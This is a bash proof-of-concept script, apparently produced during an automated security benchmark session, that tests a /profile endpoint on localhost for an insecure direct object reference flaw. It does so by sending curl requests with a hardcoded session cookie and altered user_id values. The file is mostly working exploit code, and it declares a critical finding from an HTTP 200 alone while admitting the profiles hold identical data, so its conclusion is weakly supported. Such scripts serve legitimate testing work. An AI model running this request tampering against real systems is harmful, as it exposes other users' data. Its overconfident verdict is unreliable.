#!/bin/bash
# POC: Demonstrates IDOR vulnerability by showing endpoint accepts and processes arbitrary user_id parameters without authorization validation
# Target: ./repo
# Created: 2025-11-07T18:20:51.821Z
# Session: benchmark-XBEN-023-24-mhp62996

# IDOR Vulnerability POC - GET Request Parameter Processing
# This POC demonstrates that the /profile endpoint accepts and processes
# the user_id parameter from unauthenticated/different users without
# proper authorization validation.

TARGET="http://localhost:80"
SESSION_COOKIE="eyJ1c2VyX2lkIjoxfQ.aQ43_Q.9lr0jqGyQzk7Td-Ico_oaK1MNc8"

echo "=================================================="
echo "IDOR Vulnerability POC - /profile Endpoint"
echo "Parameter Processing Vulnerability"
echo "=================================================="
echo ""

# Test 1: Verify session is authenticated as user 1
echo "[*] Test 1: Verifying authenticated session"
echo "Session cookie indicates user_id=1 (extracted from JWT-like cookie)"
echo ""

# Test 2: Request without user_id parameter (should return own profile)
echo "[*] Test 2: Request WITHOUT user_id parameter"
echo "curl -s -b 'session=$SESSION_COOKIE' '$TARGET/profile' 2>/dev/null | grep -o 'name=\"name\"[^>]*value=\"[^\"]*\"'"
echo ""

RESPONSE_NO_PARAM=$(curl -s -b "session=$SESSION_COOKIE" "$TARGET/profile" 2>/dev/null)
NO_PARAM_VALUE=$(echo "$RESPONSE_NO_PARAM" | grep -o 'name="name"[^>]*value="[^"]*"' | head -1)

echo "Response: $NO_PARAM_VALUE"
echo ""

# Test 3: Request with user_id=1 parameter (explicit own user)
echo "[*] Test 3: Request WITH user_id=1 parameter (explicit own user)"
echo "curl -s -b 'session=$SESSION_COOKIE' '$TARGET/profile?user_id=1' 2>/dev/null | grep -o 'name=\"name\"[^>]*value=\"[^\"]*\"'"
echo ""

RESPONSE_USER1=$(curl -s -b "session=$SESSION_COOKIE" "$TARGET/profile?user_id=1" 2>/dev/null)
USER1_VALUE=$(echo "$RESPONSE_USER1" | grep -o 'name="name"[^>]*value="[^"]*"' | head -1)

echo "Response: $USER1_VALUE"
echo ""

# Test 4: Request with user_id=5 parameter (different user - does not exist normally)
echo "[*] Test 4: Request WITH user_id=5 parameter (arbitrary user)"
echo "curl -s -b 'session=$SESSION_COOKIE' '$TARGET/profile?user_id=5' 2>/dev/null | grep -o 'name=\"name\"[^>]*value=\"[^\"]*\"'"
echo ""

RESPONSE_USER5=$(curl -s -b "session=$SESSION_COOKIE" "$TARGET/profile?user_id=5" 2>/dev/null)
USER5_VALUE=$(echo "$RESPONSE_USER5" | grep -o 'name="name"[^>]*value="[^"]*"' | head -1)
USER5_RESPONSE_CODE=$(curl -s -w "%{http_code}" -o /dev/null -b "session=$SESSION_COOKIE" "$TARGET/profile?user_id=5" 2>/dev/null)

echo "Response: $USER5_VALUE (HTTP $USER5_RESPONSE_CODE)"
echo ""

# Test 5: Request with negative user_id
echo "[*] Test 5: Request WITH user_id=-1 parameter (negative/invalid)"
echo "curl -s -b 'session=$SESSION_COOKIE' '$TARGET/profile?user_id=-1' 2>/dev/null"
echo ""

RESPONSE_NEGINIT=$(curl -s -b "session=$SESSION_COOKIE" "$TARGET/profile?user_id=-1" 2>/dev/null)
NEG_RESPONSE_CODE=$(curl -s -w "%{http_code}" -o /dev/null -b "session=$SESSION_COOKIE" "$TARGET/profile?user_id=-1" 2>/dev/null)
NEG_VALUE=$(echo "$RESPONSE_NEGINIT" | grep -o 'name="name"[^>]*value="[^"]*"' | head -1)

echo "Response HTTP Code: $NEG_RESPONSE_CODE"
echo "Value: $NEG_VALUE"
echo ""

# Analysis
echo "=================================================="
echo "VULNERABILITY ANALYSIS"
echo "=================================================="
echo ""

if [[ "$USER5_RESPONSE_CODE" == "200" ]]; then
    echo "[!] CRITICAL FINDING: Unauthorized parameter processing"
    echo ""
    echo "The endpoint accepts user_id parameter for ANY user ID without"
    echo "proper authorization validation. The application returns HTTP 200"
    echo "and processes the request for user_id=5 despite being authenticated"
    echo "as user_id=1."
    echo ""
    echo "This is evidence of IDOR vulnerability:"
    echo "- Endpoint allows specifying arbitrary user_id values"
    echo "- No authorization check validates access rights"
    echo "- Application treats user_id parameter as directive to fetch data"
    echo ""
    echo "Even if profiles currently have same data (due to prior compromise),"
    echo "the endpoint architecture is vulnerable to IDOR attack."
    echo ""
    exit 0
else
    echo "[!] No IDOR confirmed"
    echo "HTTP Response codes:"
    echo "  - user_id parameter accepted responses:"
    echo "    user_id=1: (own user)"
    echo "    user_id=5: HTTP $USER5_RESPONSE_CODE"
    exit 1
fi